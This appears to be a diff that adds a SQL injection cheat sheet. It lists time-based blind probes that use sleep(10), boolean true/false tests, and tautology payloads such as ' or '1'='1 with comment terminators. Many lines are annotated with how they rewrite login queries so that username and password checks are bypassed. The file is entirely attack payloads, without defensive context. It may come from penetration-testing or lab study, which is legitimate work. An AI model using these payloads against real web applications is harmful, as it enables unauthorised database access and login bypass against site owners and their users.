@@ -1,0 +1,55 @@
+1'+and+sleep(10)+--+ -- Basic injection to detect sqli
+1'+and+if(1=1, sleep(10), null)+--+ -- Returns True ( page load is approx 10 sec)
+1'+and+if(1=0, sleep(10), null)+--+ -- Returns False (page load is almost instant)
+
+1"+and+sleep(10)+--+ -- Basic injection to detect sqli 
+1"+and+if(1=1, sleep(10), null)+--+ -- Returns True ( page load is approx 10 sec) 
+1"+and+if(1=0, sleep(10), null)+--+ -- Returns False (page load is almost instant)
+
+' or '1'='1 Will work nicely. 
+' ' or '1'='1 ' LIMIT 0,1 ' or 1=1 --+ Will also work. 
+' ' or 1=1 --+ ' commented out 
+' or 1=1 # will also work. 
+' ' or 1=1 # ' commented out
+
+or 1=1 Will work nicely. 
+or 1=1 LIMIT 0,1 or 1=1 --+ Will also work. 
+or 1=1 --+ or 1=1 # Will also work. 
+or 1=1 #
+
+' ) or ('1')=('1 Will work nicely.   id = (' ') or '1'=('1 ') LIMIT 0,1
+' ) or 1=1 --+ Will also work.   id = (' ') or 1=1 --+  ') commented out
+' ) or 1=1 # will also work.       id = (' ') or 1=1 # ') commented out
+
+") or ("1")=("1 Will work nicely.   id = (" ")or ("1")=("1 ") LIMIT 0,1
+") or 1=1 --+ Will also work.   id = (" ")or 1=1 --+  ") commented out
+") or 1=1 # will also work.       id = (" ") or 1=1 #  ") commented out
+
+1' AND '1'='1 -- returns true
+1' AND '1'='0  -- returns false
+
+1'+and+sleep(10)+--+  -- Basic injection to detect sqli
+1'+and+if(1=1, sleep(10), null)+--+  -- Returns True  ( page load is approx 10 sec)
+1'+and+if(1=0, sleep(10), null)+--+  -- Returns False (page load is almost instant)
+
+1"+and+sleep(10)+--+  -- Basic injection to detect sqli
+1"+and+if(1=1, sleep(10), null)+--+  -- Returns True  ( page load is approx 10 sec)
+1"+and+if(1=0, sleep(10), null)+--+  -- Returns False (page load is almost instant)
+
+1'))+or+1=1--+  -- Basic injection to detect sqli
+
+' or '1'='1 Will work nicely if injected in username and password field.   username = ' ' or '1'='1 ' AND password = '  ' or '1'='1   '
+' or 1=1 --+ Will also work only in one field.   username = ' ' or 1=1 --+  ' commented out
+' or 1=1 # will also work only in one field.       username = ' ' or 1=1 # ' commented out
+
+") or ("1")=("1 Will work nicely.   username = (" ")or ("1")=("1 ") AND password = (" ")or ("1")=("1 ") 
+") or 1=1 --+ Will also work.   username = (" ")or 1=1 --+  ") commented out
+") or 1=1 # will also work.       username = (" ") or 1=1 #  ") commented out
+
+') or ('1')=('1 Will work nicely if injected in username and password field.   username = (' ') or ('1')=('1 ') AND password = ('  ') or ('1')=('1   ')
+') or 1=1 --+ Will also work only in one field.   username = (' ') or 1=1 --+  ' commented out
+') or 1=1 # will also work only in one field.       username = (' ') or 1=1 # ' commented out
+
+" or "1"="1 Will work nicely.   username = " " or "1"="1 " AND password = " " or "1"= "1 " 
+" or 1=1 --+ Will also work.   username = " " or 1=1 --+  " commented out
+" or 1=1 # will also work.       username = " " or 1=1 #  " commented out
